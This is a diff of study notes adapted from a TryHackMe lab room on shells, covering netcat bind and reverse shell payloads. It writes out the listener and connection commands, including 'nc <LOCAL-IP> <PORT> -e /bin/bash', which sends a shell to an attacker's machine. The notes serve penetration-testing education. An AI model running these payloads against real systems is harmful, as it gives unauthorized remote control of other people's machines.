@@ -260,19 +260,30 @@ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
 This technique will also work with the special, Linux-only TTY shell covered in the previous task...
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-From: https://tryhackme.com/room/introtoshells ; Task 8 [with some edits and rephrasing]
+From: https://tryhackme.com/room/introtoshells ; Task 8 [with some edits and rephrasing] together with information from TryHackMe – What The Shell? Walkthrough (https://cyberdad.uk/?p=246)
 
 Common Shell Payloads
 
-... let's take a look at some common payloads using the tools we've already covered ... In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection. For example, as a listener:
+... let's take a look at some common payloads using the tools we've already covered ... In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection. 
 
+Bind Shell
+----------
+For example, in order to perform a netcat bind shell, start a listener on the target (obviously you would need access to the remote target in some way first) using:
 nc -lvnp <PORT> -e /bin/bash
 
-Connecting to the above listener with netcat would result in a bind shell on the target.
+Then on your local machine connect to the listener on the remote machine with netcat using the following command:
+nc <REMOTE MACHINE'S IP> <REMOTE MACHINE'S LISTENING PORT>
 
-Equally, for a reverse shell, connecting back with:
-nc <LOCAL-IP> <PORT> -e /bin/bash
-would result in a reverse shell on the target.
+This will result in a bind shell on the target.
+
+Reverse Shell
+-------------
+In order to perform a reverse netcat shell:
+On your local machine open a netcat listening port using the following command:
+nc -lvnp <PORT>
+Then on the remote machine use the following command:
+nc <YOUR LOCAL MACHINE'S tun0 IP> <LISTENING PORT> -e /bin/bash
+This will result in your local machine receiving a reverse shell from the target remote machine.
 
 However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
 
